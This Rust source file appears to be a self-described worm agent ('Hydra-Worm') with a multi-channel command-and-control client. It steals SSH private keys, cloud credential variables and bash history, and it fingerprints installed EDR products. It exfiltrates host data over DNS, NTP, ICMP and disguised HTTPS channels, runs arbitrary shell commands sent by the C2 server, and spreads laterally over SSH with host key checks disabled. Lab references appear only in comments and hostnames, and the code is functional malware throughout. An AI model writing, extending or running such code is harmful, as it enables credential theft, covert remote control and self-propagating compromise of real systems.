// Project: Hydra-Worm Agent
use std::process::Command;
use std::net::ToSocketAddrs; // Required for runtime hostname resolution
use std::{thread, time::Duration, net::UdpSocket};
use rand::Rng;
use rand::seq::SliceRandom;
use rand_distr::{Distribution, Exp};
use serde::{Serialize, Deserialize};
use reqwest::header::{HeaderMap, HeaderValue, USER_AGENT};
use base64::{Engine as _, engine::general_purpose};
use sysinfo::System; 
use pnet::packet::icmp::echo_request::MutableEchoRequestPacket;
use pnet::packet::icmp::IcmpTypes; 
use pnet::packet::Packet;

// --- PHASE 3.3: TACTICAL LOOT SCRAPER ---
struct LootScraper;

impl LootScraper {
    fn harvest(username: &str) -> Option<String> {
        let ssh_path = if username == "root" {
            "/root/.ssh/id_rsa".to_string()
        } else {
            format!("/home/{}/.ssh/id_rsa", username)
        };

        if let Ok(content) = std::fs::read_to_string(&ssh_path) {
            let key_hint = content.lines().next().unwrap_or("DATA_HIDDEN");
            return Some(format!("LOOT:SSH:{} (Path: {})", key_hint, ssh_path));
        }

        let cloud_vars = ["AWS_ACCESS_KEY_ID", "AZURE_CLIENT_ID", "KUBECONFIG"];
        for var in cloud_vars.iter() {
            if let Ok(val) = std::env::var(var) {
                return Some(format!("LOOT:ENV:{}={}", var, val));
            }
        }

        None
    }
}

#[derive(Serialize, Clone)]
struct Telemetry {
    #[serde(rename = "a")] agent_id: String, 
    #[serde(rename = "t")] transport: String,
    #[serde(rename = "s")] status: String,
    #[serde(rename = "l")] lambda: f64,
    #[serde(rename = "h")] hostname: String,
    #[serde(rename = "u")] username: String,
    #[serde(rename = "o")] os: String,
    #[serde(rename = "e")] env_context: String,
    #[serde(rename = "p")] artifact_preview: String,
    #[serde(rename = "d")] defense_profile: String,
}

#[derive(Deserialize)]
struct C2Response {
    #[allow(dead_code)]
    status: String,
    task: String,
    epoch: i64,
}

#[derive(Deserialize)]
struct DiscoveryResponse {
    peers: Vec<String>,
    #[allow(dead_code)]
    mesh_id: String,
}

fn profile_defenses() -> String {
    let edr_signatures = [
        ("/opt/CrowdStrike/falcond", "CrowdStrike"),
        ("/var/lib/s1", "SentinelOne"),
        ("/opt/carbonblack", "CarbonBlack"),
        ("/etc/microsoft/mdatp", "Defender"),
    ];

    for (path, name) in edr_signatures.iter() {
        if std::path::Path::new(path).exists() {
            return name.to_string();
        }
    }
    "None".into()
}

fn harvest_bash_history(username: &str) -> String {
    let path = if username == "root" {
        "/root/.bash_history".to_string()
    } else {
        format!("/home/{}/.bash_history", username)
    };

    match std::fs::read_to_string(&path) {
        Ok(content) => {
            let lines: Vec<&str> = content.lines().rev().take(2).collect();
            if lines.is_empty() { 
                "Empty".into() 
            } else { 
                lines.join(" | ").replace("\"", "'") 
            }
        }
        Err(_) => "Access Denied".into(),
    }
}

trait Transport {
    fn send_heartbeat(&self, stats: &Telemetry) -> Result<C2Response, String>;
    fn get_name(&self) -> String;
}

struct DnsTransport { 
    root_domain: String,
    target_addr: String,
}

impl Transport for DnsTransport {
    fn send_heartbeat(&self, stats: &Telemetry) -> Result<C2Response, String> {
        let mut stats_min = stats.clone();
        if stats_min.artifact_preview.len() > 32 {
            stats_min.artifact_preview = format!("{}...", &stats_min.artifact_preview[..29]);
        }

        let json_data = serde_json::to_string(&stats_min).map_err(|e| e.to_string())?;
        let encoded = general_purpose::URL_SAFE_NO_PAD.encode(json_data);
        
        let mut packet = Vec::new();
        packet.extend_from_slice(&[0x13, 0x37, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]); 

        for chunk in encoded.as_bytes().chunks(60) {
            packet.push(chunk.len() as u8);
            packet.extend_from_slice(chunk);
        }

        for part in self.root_domain.split('.') {
            if part.is_empty() { continue; }
            packet.push(part.len() as u8);
            packet.extend_from_slice(part.as_bytes());
        }
        
        packet.push(0); 
        packet.extend_from_slice(&[0x00, 0x01, 0x00, 0x01]);

        let socket = UdpSocket::bind("0.0.0.0:0").map_err(|e| e.to_string())?;
        socket.set_read_timeout(Some(Duration::from_secs(2))).map_err(|e| e.to_string())?;
        
        socket.send_to(&packet, &self.target_addr).map_err(|e| e.to_string())?;

        let mut buf = [0u8; 512];
        match socket.recv_from(&mut buf) {
            Ok(_) => Ok(C2Response { status: "dns_ack".into(), task: "SLEEP".into(), epoch: 0 }),
            Err(_) => Err("DNS Timeout - No C2 ACK".into()),
        }
    }

    fn get_name(&self) -> String { "DNS-Tunnel".into() }
}

struct NtpTransport { pool_addr: String }

impl Transport for NtpTransport {
    fn send_heartbeat(&self, stats: &Telemetry) -> Result<C2Response, String> {
        let socket = UdpSocket::bind("0.0.0.0:0").map_err(|e| e.to_string())?;
        socket.set_read_timeout(Some(Duration::from_secs(3))).map_err(|e| e.to_string())?;
        
        let json_data = serde_json::to_string(stats).map_err(|e| e.to_string())?;
        let encoded = general_purpose::URL_SAFE_NO_PAD.encode(json_data);
        
        let mut ntp_packet = vec![0u8; 48];
        ntp_packet[0] = 0x1b; 
        ntp_packet.extend_from_slice(encoded.as_bytes());

        socket.send_to(&ntp_packet, &self.pool_addr).map_err(|e| e.to_string())?;

        let mut buf = [0u8; 1024];
        let (amt, _) = socket.recv_from(&mut buf).map_err(|e| e.to_string())?;
        
        if amt >= 48 && &buf[48..53] == b"T-ACK" {
            Ok(C2Response { status: "ntp_synced".into(), task: "WAIT".into(), epoch: 0 })
        } else {
            Err("NTP_SIG_FAIL".into())
        }
    }

    fn get_name(&self) -> String { "NTP-Signaling".into() }
}

struct IcmpTransport { target_ip: std::net::Ipv4Addr }

impl Transport for IcmpTransport {
    fn send_heartbeat(&self, stats: &Telemetry) -> Result<C2Response, String> {
        let json_data = serde_json::to_string(stats).map_err(|e| e.to_string())?;
        let encoded = general_purpose::URL_SAFE_NO_PAD.encode(json_data);
        
        let mut buffer = vec![0u8; 8 + encoded.len()];
        let mut packet = MutableEchoRequestPacket::new(&mut buffer).unwrap();
        packet.set_icmp_type(IcmpTypes::EchoRequest);
        packet.set_payload(encoded.as_bytes());
        
        let (mut tx, mut rx) = pnet::transport::transport_channel(
            4096,
            pnet::transport::TransportChannelType::Layer4(pnet::transport::TransportProtocol::Ipv4(pnet::packet::ip::IpNextHeaderProtocols::Icmp))
        ).map_err(|e| e.to_string())?;

        tx.send_to(packet, std::net::IpAddr::V4(self.target_ip)).map_err(|e| e.to_string())?;

        let mut rx_iter = pnet::transport::icmp_packet_iter(&mut rx);
        
        match rx_iter.next_with_timeout(Duration::from_millis(2000)) {
            Ok(Some((packet, addr))) if addr == std::net::IpAddr::V4(self.target_ip) => {
                let rx_payload = packet.payload();
                
                if rx_payload.len() >= 14 && &rx_payload[4..14] == b"HYDRA_WAKE" {
                    return Ok(C2Response { status: "resurrected".into(), task: "RESUME".into(), epoch: 1 });
                }

                if rx_payload.len() >= 13 && &rx_payload[4..13] == b"HYDRA_ACK" {
                    return Ok(C2Response { status: "icmp_ack_verified".into(), task: "SLEEP".into(), epoch: 0 });
                }
                
                Err("SIG_FAIL".into())
            },
            _ => Err("OFFLINE".into())
        }
    }

    fn get_name(&self) -> String { "ICMP-Failsafe".into() }
}

struct MalleableHttps { c2_url: String }

impl Transport for MalleableHttps {
    fn send_heartbeat(&self, stats: &Telemetry) -> Result<C2Response, String> {
        let profile = MalleableProfile::new();
        let client = reqwest::blocking::Client::builder()
            .use_rustls_tls()
            .timeout(Duration::from_secs(5))
            .build()
            .map_err(|e: reqwest::Error| e.to_string())?;

        let response = client.post(&self.c2_url)
            .headers(profile.headers.clone())
            .header(USER_AGENT, &profile.user_agent)
            .header("X-Hydra-Key", &profile.hydra_key)
            .json(stats)
            .send()
            .map_err(|e: reqwest::Error| format!("Network Error: {}", e))?;

        if response.status().is_success() {
            let body: C2Response = response.json().map_err(|e: reqwest::Error| e.to_string())?;
            Ok(body)
        } else {
            Err(format!("HTTP Error: {}", response.status()))
        }
    }
    fn get_name(&self) -> String { "Malleable-HTTPS".into() }
}

struct MalleableProfile {
    user_agent: String,
    hydra_key: String,
    headers: HeaderMap,
}

impl MalleableProfile {
    fn new() -> Self {
        let mut rng = rand::thread_rng();
        let uas = vec![
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
        ];
        let mut headers = HeaderMap::new();
        headers.insert(reqwest::header::ACCEPT, HeaderValue::from_static("application/json, text/plain, */*"));
        let key: String = (0..8).map(|_| rng.gen_range(b'A'..=b'Z') as char).collect();
        Self {
            user_agent: uas.choose(&mut rng).unwrap().to_string(),
            hydra_key: key,
            headers,
        }
    }
}

struct CloudTransport { endpoint: String }
impl Transport for CloudTransport {
    fn send_heartbeat(&self, stats: &Telemetry) -> Result<C2Response, String> {
        let client = reqwest::blocking::Client::new();
        let res = client.post(&self.endpoint)
            .header("Authorization", "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9") 
            .json(stats)
            .send()
            .map_err(|e| e.to_string())?;

        if res.status().is_success() {
            Ok(res.json().map_err(|e| e.to_string())?)
        } else {
            Err(format!("Cloud API Error: {}", res.status()))
        }
    }
    fn get_name(&self) -> String { "Azure-Graph-Mock".into() }
}

struct P2PTransport;
impl Transport for P2PTransport {
    fn send_heartbeat(&self, _stats: &Telemetry) -> Result<C2Response, String> {
        Err("Tier 3 - Mesh discovery active".into())
    }
    fn get_name(&self) -> String { "P2P-Gossip-Mesh".into() }
}

// --- PHASE 3.5: INFECTION ENGINE (LATERAL MOVEMENT) ---
struct InfectionEngine;

impl InfectionEngine {
    fn execute_pivot(target_ip: &str, payload_cmd: &str) {
        let target = target_ip.to_string();
        let payload = payload_cmd.to_string();

        thread::spawn(move || {
            println!("[!] PIVOT_ENGAGED > Targeting node: {}", target);
            // SSH pivot using harvested keys/access from the lab environment
            // In the lab, we bypass host key verification for seamless propagation
            let status = Command::new("sh")
                .arg("-c")
                .arg(format!(
                    "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {} '{}'", 
                    target, 
                    payload
                ))
                .status();

            match status {
                Ok(s) if s.success() => println!("[+] SUCCESS > Payload deployed to {}", target),
                Ok(s) => println!("[?] STAGE_2_REQUIRED > SSH connected but returned exit code: {}", s),
                Err(e) => println!("[!] PIVOT_FAILED > Connection to {} failed: {}", target, e),
            }
        });
    }
}

struct Agent {
    id: String,
    transport: Box<dyn Transport>,
    failures: u32,
    state: u8,
    lambda: f64,
    last_command_output: String,
    // --- PHASE 3.4 STORAGE ---
    neighbors: Vec<String>,
    cycle_count: u64,
}

fn detect_env() -> String {
    if std::path::Path::new("/.dockerenv").exists() {
        return "Docker-Container".into();
    }
    let client = reqwest::blocking::Client::builder()
        .timeout(Duration::from_millis(300))
        .build()
        .unwrap_or_default();
    match client.get("http://169.254.169.254/latest/meta-data/instance-id").send() {
        Ok(_) => "Cloud-Instance".into(),
        Err(_) => "Bare-Metal/VM".into(),
    }
}

impl Agent {
    fn new(id: &str) -> Self {
        let c2_hostname = "hydra-c2-lab"; 
        Self {
            id: id.to_string(),
            transport: Box::new(CloudTransport { 
                endpoint: format!("http://{}:8080/api/v1/cloud-mock", c2_hostname) 
            }),
            failures: 0,
            state: 0,
            lambda: 0.2, // Base frequency for jitter
            last_command_output: String::new(),
            neighbors: Vec::new(),
            cycle_count: 0,
        }
    }

    fn run(&mut self) {
        let mut sys = System::new_all();
        sys.refresh_all();
        let hostname = System::host_name().unwrap_or_else(|| "unknown_host".into());
        let user_list = sysinfo::Users::new_with_refreshed_list();
        let current_pid = sysinfo::get_current_pid().unwrap();
        
        let username = sys.process(current_pid)
            .and_then(|p| {
                let uid = p.user_id()?;
                user_list.iter().find(|u| u.id() == uid)
            })
            .map(|u| u.name().to_string())
            .unwrap_or_else(|| "unknown_user".into());
            
        let os_info = format!("{} {}", System::name().unwrap_or_default(), System::os_version().unwrap_or_default());
        let env_ctx = detect_env();

        loop {
            // --- PHASE 3.4: P2P MESH REFRESH ---
            if self.cycle_count % 5 == 0 {
                self.refresh_mesh();
            }
            self.cycle_count += 1;

            // --- PHASE 3.3 PRIORITY LOGIC ---
            let artifact_data = if !self.last_command_output.is_empty() {
                let out = self.last_command_output.clone();
                self.last_command_output.clear();
                out
            } else if let Some(loot) = LootScraper::harvest(&username) {
                loot
            } else {
                harvest_bash_history(&username)
            };

            let defense_ctx = profile_defenses(); 
            let stats = Telemetry {
                agent_id: self.id.clone(),
                transport: self.transport.get_name(),
                status: "OK".into(),
                lambda: self.lambda,
                hostname: hostname.clone(),
                username: username.clone(),
                os: os_info.clone(),
                env_context: env_ctx.clone(),
                artifact_preview: artifact_data,
                defense_profile: defense_ctx.clone(), 
            };

            // --- HEARTBEAT & COMMAND EXECUTION ---
            match self.transport.send_heartbeat(&stats) {
                Ok(res) => {
                    println!("[+] C2 Status: {} | Defense: {} | Activity: {}", res.status, stats.defense_profile, stats.artifact_preview);
                    self.failures = 0;

                    if res.task != "WAIT" && res.task != "NOP" && res.task != "SLEEP" && !res.task.is_empty() {
                        let parts: Vec<&str> = res.task.split_whitespace().collect();
                        
                        // PHASE 3.5: Infection Routing
                        if parts[0] == "PROPAGATE" && parts.len() >= 3 {
                            let target_ip = parts[1];
                            let payload = parts[2..].join(" ");
                            InfectionEngine::execute_pivot(target_ip, &payload);
                            self.last_command_output = format!("INFECTING:{}", target_ip);
                        } else {
                            // Standard RCE Logic
                            let output = if cfg!(target_os = "windows") {
                                Command::new("cmd").args(["/C", &res.task]).output()
                            } else {
                                Command::new("sh").args(["-c", &res.task]).output()
                            };

                            match output {
                                Ok(out) => {
                                    let stdout = String::from_utf8_lossy(&out.stdout).trim().to_string();
                                    let stderr = String::from_utf8_lossy(&out.stderr).trim().to_string();
                                    if !stdout.is_empty() {
                                        self.last_command_output = format!("OUT:{}", if stdout.len() > 50 { format!("{}...", &stdout[..47]) } else { stdout });
                                    } else if !stderr.is_empty() {
                                        self.last_command_output = format!("OUT:ERR: {}", stderr);
                                    }
                                }
                                Err(e) => {
                                    self.last_command_output = format!("OUT:EXEC_FAIL: {}", e);
                                }
                            }
                        }
                    }
                },
                Err(e) => {
                    println!("[-] Failure ({}): {}", self.transport.get_name(), e);
                    self.failures += 1;
                    if self.transport.get_name() == "ICMP-Failsafe" || self.failures >= 3 {
                        self.mutate();
                        continue; 
                    }
                }
            }

            // --- ADAPTIVE JITTER SLEEP ---
            let mut rng = rand::thread_rng();
            let mut current_lambda = self.lambda;
            if defense_ctx != "None" { current_lambda /= 2.0; }

            let exp = Exp::new(current_lambda).unwrap();
            let max_sleep = if defense_ctx != "None" { 300.0 } else { 60.0 };
            let sleep_time = exp.sample(&mut rng).min(max_sleep).max(1.0);
            
            println!("[*] Cycle complete. Jitter sleep: {:.2}s", sleep_time);
            thread::sleep(Duration::from_secs_f64(sleep_time));
        }
    }

    fn mutate(&mut self) {
        self.state = (self.state + 1) % 6;
        self.failures = 0;
        let c2_hostname = "hydra-c2-lab"; 
        
        let c2_ip = format!("{}:80", c2_hostname)
            .to_socket_addrs()
            .map(|mut addrs| addrs.next().map(|s| s.ip()))
            .unwrap_or(None)
            .and_then(|ip| match ip {
                std::net::IpAddr::V4(v4) => Some(v4),
                _ => None,
            })
            .unwrap_or_else(|| "10.5.0.5".parse().unwrap());

        println!("[!!!] ALERT: Triggering Transport Mutation to Tier {}...", self.state + 1);

        self.transport = match self.state {
            0 => Box::new(CloudTransport { endpoint: format!("http://{}:8080/api/v1/cloud-mock", c2_hostname) }),
            1 => Box::new(MalleableHttps { c2_url: format!("http://{}:8080/api/v1/heartbeat", c2_hostname) }),
            2 => Box::new(P2PTransport),
            3 => Box::new(IcmpTransport { target_ip: c2_ip }),
            4 => Box::new(NtpTransport { pool_addr: format!("{}:123", c2_hostname) }),
            _ => Box::new(DnsTransport { 
                root_domain: "c2.hydra-worm.local".into(),
                target_addr: format!("{}:53", c2_hostname) 
            }),
        };
    }

    fn refresh_mesh(&mut self) {
        let c2_hostname = "hydra-c2-lab"; 
        let url = format!("http://{}:8080/api/v1/mesh/peers", c2_hostname);
        
        let client = reqwest::blocking::Client::builder()
            .timeout(Duration::from_secs(3))
            .build()
            .unwrap_or_default();

        if let Ok(res) = client.get(&url).send() {
            if let Ok(data) = res.json::<DiscoveryResponse>() {
                self.neighbors = data.peers.into_iter()
                    .filter(|peer_id| peer_id != &self.id)
                    .collect();
                
                if !self.neighbors.is_empty() {
                    println!("[+] Mesh Discovery: {} active neighbors identified.", self.neighbors.len());
                }
            }
        }
    }
}

fn display_splash() {
    println!(r#"
           / /_  __  ______  __/ /__________ _   
          / __ \/ / / / __ \/ __  / ___/ __ `/   
         / / / / /_/ / /_/ / /_/ / /  / /_/ /    
        /_/ /_/\__, / .___/\__,_/_/   \__,_/     
   _      ____/____/_/___  ____ ___              
  | | /| / / __ \/ __ \/ __ `__ \                
  | |/ |/ / /_/ / /_/ / / / / / /                
  |__/|__/\____/_/ .__/_/ /_/ /_/                 
                /_/                              
    "#);
    println!("      [ Phase 3.3: Credential Management - Looting Vault Engaged ]\n");
}

fn main() {
    display_splash();
    
    let agent_id = std::env::var("AGENT_ID").unwrap_or_else(|_| {
        let mut rng = rand::thread_rng();
        format!("HYDRA-NODE-{:04X}", rng.gen_range(0..u16::MAX))
    });

    let mut agent = Agent::new(&agent_id);
    agent.run();
}